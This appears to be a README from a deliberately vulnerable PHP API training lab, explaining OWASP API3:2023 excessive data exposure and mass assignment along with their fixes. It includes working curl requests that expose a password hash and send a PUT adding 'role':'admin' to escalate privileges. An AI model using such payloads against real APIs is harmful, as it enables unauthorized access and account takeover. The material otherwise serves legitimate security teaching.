# API3:2023 — Broken Object Property Level Authorization

**Module file:** `php-api/src/modules/bopla.php`  
**Vulnerable endpoints:** `GET /api/bopla/user`, `PUT /api/bopla/user`  
**Secure endpoint:** `GET /api/bopla/user/secure`

## What This Vulnerability Is

This OWASP item combines two older vulnerabilities into one category because they share the same root cause: the API does not control which object properties a user can read or write.

- **Excessive Data Exposure** — `SELECT *` returns every column in the row, including `password` (the MD5 hash), which the caller should never receive.
- **Mass Assignment** — the update endpoint builds an SQL `SET` clause directly from the keys in the user's JSON body. A caller who sends `{"role":"admin"}` literally updates the `role` column in the database.

Both vulnerabilities require a valid JWT token — they assume the user is logged in but demonstrate that authentication alone is not enough.

## The Exploit — Step by Step

### Prerequisites — Get a Token

```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
echo "Token: $TOKEN"
```

### Attack 1 — Excessive Data Exposure

```bash
curl http://localhost:8080/api/bopla/user \
  -H "Authorization: Bearer $TOKEN"
```

*The `password` field — the MD5 hash — should never appear in an API response. Once an attacker has it, they can attempt offline hash cracking (see API2 README).*

### Attack 2 — Mass Assignment (Privilege Escalation)

Send a `PUT` request with fields you should not be allowed to change:

```bash
curl -X PUT http://localhost:8080/api/bopla/user \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin","balance":999999}'
```

The SQL query is shown in the response — which is also a misconfiguration — but more importantly it confirms that alice's role is now `admin` and her balance is now `999999`. A regular user promoted themselves to admin through a normal update endpoint.

### Verify the escalation worked

```bash
curl 'http://localhost:8080/api/bola?user_id=1'
# role is now "admin", balance is "999999.00"
```

## The Vulnerable Code

### GET — Excessive Data Exposure

`SELECT *` retrieves every column in the `users` table and `json_encode()` serialises all of it into the response. The developer trusted that "whatever is in the database is fine to send" — which is never true for a table that stores password hashes, roles, and financial data.

### PUT — Mass Assignment

The `foreach` loop iterates over every key-value pair the caller sent in the JSON body and turns each one into a SQL assignment. The variable `$col` — the column name — comes directly from user input. There is no list of permitted columns. The attacker controls which columns are written to and with what values.

## The Fix — Exactly What Changed

### GET — Secure version

**Changed — `SELECT *` replaced with an explicit column list:**  
`SELECT id, username, email, created_at` names exactly four columns. `password`, `role`, and `balance` are not in the list, so MySQL never retrieves them and PHP never serialises them. An attacker receiving this response gets nothing they should not have.

The rule this enforces: define your API's output schema explicitly, not by returning whatever happens to be in the database row.

### PUT — What a secure version does

There is no `/api/bopla/user/secure` PUT endpoint in the lab because the point of the vulnerable PUT is to demonstrate mass assignment. A production-grade fix would look like this:

The critical change: instead of iterating over `$body` (user-controlled), iterate over `$allowed_fields` (server-controlled). The user's keys are looked up in the allowlist — not used as the allowlist. `role`, `balance`, `password`, and `id` are not in `$allowed_fields`, so no matter what the attacker sends in the JSON body, those columns are never written.
